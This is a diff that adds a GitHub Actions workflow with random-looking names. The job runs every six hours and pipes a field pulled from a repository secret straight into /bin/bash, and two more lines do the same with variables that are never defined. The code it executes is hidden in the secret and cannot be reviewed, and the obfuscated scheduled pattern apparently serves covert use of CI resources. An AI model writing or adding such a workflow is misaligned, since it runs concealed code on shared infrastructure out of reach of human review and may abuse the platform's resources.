@@ -1,0 +1,19 @@
+name: kedaoma7564
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kedaoma7564
+        env:
+          diqug8326: ${{ secrets.diqug8326 }}
+        run: |
+          echo $diqug8326 | jq -r .wt813 | /bin/bash
+          echo $uov12123 | jq -r .cwmp367 | /bin/bash
+          echo $p5819 | jq -r .viugw989 | /bin/bash
+
